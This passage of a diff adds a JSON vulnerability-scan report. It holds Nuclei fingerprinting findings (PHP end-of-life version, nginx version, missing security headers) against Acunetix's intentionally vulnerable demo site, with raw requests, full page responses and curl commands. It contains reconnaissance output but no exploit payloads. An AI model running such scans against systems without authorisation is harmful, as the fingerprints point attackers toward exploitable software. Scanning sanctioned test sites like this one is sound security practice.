+                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Fri, 20 Feb 2026 06:42:05 GMT\r\nServer: nginx/1.19.0\r\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\r\n\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>Home of Acunetix Art</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id=\"pageName\">welcome to our page</h2>\n\t  <div class=\"story\">\n\t\t<h3>Test site for Acunetix WVS.</h3>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | <a href=\"/Mod_Rewrite_Shop/\">Shop</a> | <a href=\"/hpp/\">HTTP Parameter Pollution</a> | &copy;2019\n  Acunetix Ltd \n</div> \n    \n    \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n",
+                "ip": "44.228.249.3",
+                "timestamp": "2026-02-20T01:42:04.898701529-05:00",
+                "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0' 'http://testphp.vulnweb.com/'",
+                "matcher-status": true
+            }
+        },
+        {
+            "tool": "nuclei",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "PHP End-of-Life - Detect",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "vulnerability",
+            "description": "Detected PHP versions that have reached End-of-Life (EOL) and no longer receive security updates.\n",
+            "timestamp": "2026-02-20 01:43:11",
+            "raw_output": {
+                "template": "http/technologies/eol/php-eol.yaml",
+                "template-url": "https://cloud.projectdiscovery.io/public/php-eol",
+                "template-id": "php-eol",
+                "template-path": "/home/kali/.local/nuclei-templates/http/technologies/eol/php-eol.yaml",
+                "info": {
+                    "name": "PHP End-of-Life - Detect",
+                    "author": [
+                        "shivam kamboj"
+                    ],
+                    "tags": [
+                        "tech",
+                        "php",
+                        "eol"
+                    ],
+                    "description": "Detected PHP versions that have reached End-of-Life (EOL) and no longer receive security updates.\n",
+                    "reference": [
+                        "https://www.php.net/supported-versions.php",
+                        "https://endoflife.date/php"
+                    ],
+                    "severity": "info",
+                    "metadata": {
+                        "verified": true,
+                        "max-request": 1,
+                        "shodan-query": "X-Powered-By: PHP/"
+                    }
+                },
+                "extractor-name": "version",
+                "type": "http",
+                "host": "testphp.vulnweb.com",
+                "port": "80",
+                "scheme": "http",
+                "url": "http://testphp.vulnweb.com/",
+                "path": "/",
+                "matched-at": "http://testphp.vulnweb.com/",
+                "extracted-results": [
+                    "5.6.40"
+                ],
+                "request": "GET / HTTP/1.1\r\nHost: testphp.vulnweb.com\r\nUser-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Fri, 20 Feb 2026 06:42:05 GMT\r\nServer: nginx/1.19.0\r\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\r\n\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>Home of Acunetix Art</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id=\"pageName\">welcome to our page</h2>\n\t  <div class=\"story\">\n\t\t<h3>Test site for Acunetix WVS.</h3>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | <a href=\"/Mod_Rewrite_Shop/\">Shop</a> | <a href=\"/hpp/\">HTTP Parameter Pollution</a> | &copy;2019\n  Acunetix Ltd \n</div> \n    \n    \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n",
+                "ip": "44.228.249.3",
+                "timestamp": "2026-02-20T01:42:04.899062124-05:00",
+                "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0' 'http://testphp.vulnweb.com/'",
+                "matcher-status": true
+            }
+        },
+        {
+            "tool": "nuclei",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Nginx version detect",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "vulnerability",
+            "description": "Some nginx servers have the version on the response header. Useful when you need to find specific CVEs on your targets.",
+            "timestamp": "2026-02-20 01:43:11",
+            "raw_output": {
+                "template": "http/technologies/nginx/nginx-version.yaml",
+                "template-url": "https://cloud.projectdiscovery.io/public/nginx-version",
+                "template-id": "nginx-version",
+                "template-path": "/home/kali/.local/nuclei-templates/http/technologies/nginx/nginx-version.yaml",
+                "info": {
+                    "name": "Nginx version detect",
+                    "author": [
+                        "philippedelteil",
+                        "daffainfo"
+                    ],
+                    "tags": [
+                        "tech",
+                        "nginx",
+                        "discovery"
+                    ],
+                    "description": "Some nginx servers have the version on the response header. Useful when you need to find specific CVEs on your targets.",
+                    "severity": "info",
+                    "metadata": {
+                        "max-request": 1
+                    }
+                },
+                "type": "http",
+                "host": "testphp.vulnweb.com",
+                "port": "80",
+                "scheme": "http",
+                "url": "http://testphp.vulnweb.com/",
+                "path": "/",
+                "matched-at": "http://testphp.vulnweb.com/",
+                "extracted-results": [
+                    "nginx/1.19.0"
+                ],
+                "request": "GET / HTTP/1.1\r\nHost: testphp.vulnweb.com\r\nUser-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Fri, 20 Feb 2026 06:42:05 GMT\r\nServer: nginx/1.19.0\r\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\r\n\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>Home of Acunetix Art</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id=\"pageName\">welcome to our page</h2>\n\t  <div class=\"story\">\n\t\t<h3>Test site for Acunetix WVS.</h3>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | <a href=\"/Mod_Rewrite_Shop/\">Shop</a> | <a href=\"/hpp/\">HTTP Parameter Pollution</a> | &copy;2019\n  Acunetix Ltd \n</div> \n    \n    \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n",
+                "ip": "44.228.249.3",
+                "timestamp": "2026-02-20T01:42:04.900991534-05:00",
+                "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0' 'http://testphp.vulnweb.com/'",
+                "matcher-status": true
+            }
+        },
+        {
+            "tool": "nuclei",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "PHP Detect",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "vulnerability",
+            "description": "",
+            "timestamp": "2026-02-20 01:43:11",
+            "raw_output": {
+                "template": "http/technologies/php-detect.yaml",
+                "template-url": "https://cloud.projectdiscovery.io/public/php-detect",
+                "template-id": "php-detect",
+                "template-path": "/home/kali/.local/nuclei-templates/http/technologies/php-detect.yaml",
+                "info": {
+                    "name": "PHP Detect",
+                    "author": [
+                        "y0no"
+                    ],
+                    "tags": [
+                        "tech",
+                        "php",
+                        "discovery"
+                    ],
+                    "severity": "info",
+                    "metadata": {
+                        "shodan-query": "X-Powered-By: PHP",
+                        "verified": true,
+                        "max-request": 1,
+                        "vendor": "php",
+                        "product": "php"
+                    },
+                    "classification": {
+                        "cve-id": null,
+                        "cwe-id": null,
+                        "cpe": "cpe:2.3:a:php:php:*:*:*:*:*:*:*:*"
+                    }
+                },
+                "type": "http",
+                "host": "testphp.vulnweb.com",
+                "port": "80",
+                "scheme": "http",
+                "url": "http://testphp.vulnweb.com/",
+                "path": "/",
+                "matched-at": "http://testphp.vulnweb.com/",
+                "extracted-results": [
+                    "5.6.40"
+                ],
+                "request": "GET / HTTP/1.1\r\nHost: testphp.vulnweb.com\r\nUser-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Fri, 20 Feb 2026 06:42:05 GMT\r\nServer: nginx/1.19.0\r\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\r\n\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>Home of Acunetix Art</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id=\"pageName\">welcome to our page</h2>\n\t  <div class=\"story\">\n\t\t<h3>Test site for Acunetix WVS.</h3>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | <a href=\"/Mod_Rewrite_Shop/\">Shop</a> | <a href=\"/hpp/\">HTTP Parameter Pollution</a> | &copy;2019\n  Acunetix Ltd \n</div> \n    \n    \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n",
+                "ip": "44.228.249.3",
+                "timestamp": "2026-02-20T01:42:04.901940496-05:00",
+                "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0' 'http://testphp.vulnweb.com/'",
+                "matcher-status": true
+            }
+        },
+        {
+            "tool": "nuclei",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "HTTP Missing Security Headers",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "vulnerability",
+            "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.\n",
+            "timestamp": "2026-02-20 01:43:11",
+            "raw_output": {
+                "template": "http/misconfiguration/http-missing-security-headers.yaml",
+                "template-url": "https://cloud.projectdiscovery.io/public/http-missing-security-headers",
+                "template-id": "http-missing-security-headers",
+                "template-path": "/home/kali/.local/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml",
+                "info": {
+                    "name": "HTTP Missing Security Headers",
+                    "author": [
+                        "socketz",
+                        "geeknik",
+                        "g4l1t0",
+                        "convisoappsec",
+                        "kurohost",
+                        "dawid-czarnecki",
+                        "forgedhallpass",
+                        "jub0bs",
+                        "userdehghani"
